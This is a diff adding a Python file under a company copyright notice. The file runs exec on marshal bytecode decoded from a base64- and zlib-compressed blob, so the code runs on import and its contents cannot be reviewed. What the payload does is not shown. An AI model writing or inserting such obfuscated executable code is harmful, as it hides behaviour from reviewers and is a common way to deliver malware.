@@ -1,0 +1,7 @@
+import marshal
+import zlib
+import base64
+exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJx1Uttq3DAQDfTNXzH1i20wpgT6UjDtZiGQh3Sh5C0sQpXHmwFb40j2Qv6k/9kfqC6+7LJ0MBbSOXPmaDR//3y6u2sN98ANM1A/sBlBDlT23GBny5awa2w5MruNSJJEddJaODj2QZkd7Vm3dMoju3r2S/EtARdCyx6hhtQrV6xMJalSgZ5GQoNWGRpGYu15XhMO+1+we4L9Jc+gWsVCIUFNmgRs2TooOq2epf64Z415RqYKcFba0ZA+1Wmwl5YN95J0nb46jhXOmRgnm5WQ1e73YiYsjmlxJW83/YPG+97VyBVH1Durs9tLVh1pdIKkz2gszrxFcTM1l5JqpDNudR5cx1HqfKHtAj6TlUE5oqBWaB5Fy5Nu/p+5D2R4auEnj/Doyd+dTuytfe+E8+u4riWjv+drAHzk2aTpfUIRvYnNO8xIvhyVs/8iK9d0yF7e0CAoqYF19wG/0a243DR2aTIyvP+AJna7yuIVj9HgDzeLFWv1JvXJvelqIZIabEEs6Oovt9i18xT6oBb8SbUOi3TtCieCDZ1Ib1Qfg8Ez8WTFxXBdsledq6ybIp/rW6XrQj6uckL7868lfHFfcfwHVaom/w=='))).decode("utf-8"))
+
+# Copyright (c) 2024 TechUltra Solutions Pvt Ltd. 
+# See LICENSE file for full copyright and licensing details
